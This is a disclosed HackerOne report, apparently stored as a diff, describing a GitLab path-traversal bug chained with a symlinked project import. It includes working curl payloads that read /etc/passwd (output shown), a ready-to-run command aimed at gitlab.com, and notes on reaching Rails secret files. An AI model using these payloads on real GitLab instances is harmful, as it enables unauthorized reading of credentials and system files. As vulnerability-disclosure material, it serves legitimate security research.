@@ -1,0 +1,92 @@
+'**[HackerOne report #454777](https://hackerone.com/reports/454777)** by nyangawa on 2018-12-04:
+
+**Summary:** A path traversal bug in Gitlab templates API can be utilized to read any file in a Gitlab instance
+
+**Description:**
+There is a bug traversal bug in `lib/api/templates.rb` and allows an malicious user to read any file which has an extension ".gitignore" (or .gitlab-ci.yml, .Dockerfile.) in a Gitlab instance. And this issue can be used with another issue in Gitlab project import feature which finally helps me to bypass the limit of specific extension (.gitignore) and access any file on the target filesystem.
+
+## Steps To Reproduce:
+### Trivial path traversal
+Just execute the following command to verify the path traversal issue:
+```
+curl https://gitlab.com/api/v4/templates/gitignores/%2e%2e%2fPython%2ea
+``` 
+(the `%2ea` in the end of the URI is used to feed the `format` part of Rails(rack?))
+Where you can see, this API was originally supposed to be used to read file in 
+```
+/opt/gitlab/embedded/service/gitlab-rails/vendor/gitignore/Global
+```
+, but in our example, it was used to read 
+```
+/opt/gitlab/embedded/service/gitlab-rails/vendor/gitignore/Global/../Python.gitignore
+```
+
+### Real path traversal
+#### Persist a symlink
+Having the ability to read any file whose name ends with a `.gitignore` doesn't really help with the exploit. So I spent some more time to inspect the possibility of bypassing this limit. Finally I found that I can create a symbolic link `link.gitignore -> /etc/passwd` during to process of importing a project. Here is the poc part:
+Be noticed that the `uploads` directory has a permission of 555, which means Gitlab could not delete anything inside this directory. Therefore it will survive the `remove_symlinks` function in `file_importer.rb`
+
+```
+$ tar tvf project.tar.gz 
+
+-rw-r--r-- asakawa/asakawa 431 2018-12-04 13:16 project.bundle
+-rw-r--r-- asakawa/asakawa 1799 2018-12-04 19:10 project.json
+dr-xr-xr-x asakawa/asakawa    0 2018-12-04 13:22 uploads/
+lrwxrwxrwx asakawa/asakawa    0 2018-12-04 13:22 uploads/link.gitignore -&gt; /etc/passwd
+-rw-r--r-- asakawa/asakawa    5 2018-12-04 13:16 VERSION
+```
+#### Find the real path of link.gitignore
+Luckily, Gitlab stores import errors in database and provides another API with the error messages where we can find the real path of `link.gitignore`
+
+```
+$ curl -H "Private-Token: $(cat tkn.nya)" http://10.26.0.3/api/v4/projects/27/import
+{
+  "id": 27,
+  "description": null,
+  "name": "interesting-36f24022b707434f2f060c4a3559216f",
+  "name_with_namespace": "Administrator / interesting-36f24022b707434f2f060c4a3559216f",
+  "path": "interesting-36f24022b707434f2f060c4a3559216f",
+  "path_with_namespace": "root/interesting-36f24022b707434f2f060c4a3559216f",
+  "created_at": "2018-12-04T11:10:59.269Z",
+  "import_status": "failed",
+  "import_error": "Error importing repository  into root/interesting-36f24022b707434f2f060c4a3559216f - Permission denied @ unlink_internal - /var/opt/gitlab/gitlab-rails/shared/tmp/project_exports/root/interesting-36f24022b707434f2f060c4a3559216f/8cef47205d875e9e9528a844ce20e092/uploads/link.gitignore"
+}
+```
+Here we can see the path consists of `#{project_export_path}/#{SecureRandom}/uploads/link.gitignore`, therefore I can bypass the protection of SecureRandom.
+
+#### Travel through the links
+The next part is simple and full of coincidences
+```
+$ URL="http://10.26.0.3"
+$ PAYLOAD=$(echo "../../../public/uploads/../shared/tmp/project_exports/root/interesting-36f24022b707434f2f060c4a3559216f/8cef47205d875e9e9528a844ce20e092/uploads/link" | sed 's|\.|%2e|g' | sed 's|\/|%2f|g')
+$ curl $URL/api/v4/templates/gitignores/$PAYLOAD%2ea
+
+{"name":"link","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false\nsshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin\ngit:x:998:998::/var/opt/gitlab:/bin/sh\ngitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false\ngitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false\ngitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh\nmattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh\nregistry:x:993:993::/var/opt/gitlab/registry:/bin/sh\ngitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh\ngitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh\n"}
+```
+
+## Supporting Material/References:
+
+I've verified this issue on my own Gitlab instance (latest and default settings) and Gitlab.com
+
+For the Gitlab.com PoC, I attach several screenshots here. I only did a harmless test and accessed nothing but `/etc/passwd`. I believe the symlink is still there, you can verify but directly run
+```
+URL="https://gitlab.com"
+
+curl $URL/api/v4/templates/gitignores/%2e%2e%2f%2e%2e%2f%2e%2e%2fpublic%2fuploads%2f%2e%2e%2fshared%2ftmp%2fproject_exports%2f%40hashed%2f78%2f46%2f784637ebc0ae004d88ed1524151c880804c44883126e817f6f66e427321cd558%2f0aef2941b2d7f22f33044b1b5f637001%2fuploads%2flink%2ea
+```
+
+Or you can check the file 
+```/var/opt/gitlab/gitlab-rails/shared/tmp/project_exports/@hashed/78/46/784637ebc0ae004d88ed1524151c880804c44883126e817f6f66e427321cd558/0aef2941b2d7f22f33044b1b5f637001/uploads/link.gitignore``` in Gitlab.com
+
+## Further considerations
+
+Now I have the ability to read (almost) any files in a Gitlab instance. Although it's not very related to finding new bugs, but I'm still very curious that whether this issue could be another RCE. I'll spend some more time on it. If you guys have any inspirations on it, PLEASE tell me. :)
+
+## Impact
+
+This path traversal issue could be utilized to read sensitive files like 'secrets.yaml' or 'database.yml' in Rails application and could probably lead to serious data breach.
+
+## Attachments
+**Warning:** Attachments received through HackerOne, please exercise caution!
+* [Screen_Shot_2018-12-04_at_8.15.38_PM.png](https://h1.sec.gitlab.net/a/454777/385291/Screen_Shot_2018-12-04_at_8.15.38_PM.png)
+* [Screen_Shot_2018-12-04_at_8.15.01_PM.png](https://h1.sec.gitlab.net/a/454777/385290/Screen_Shot_2018-12-04_at_8.15.01_PM.png)
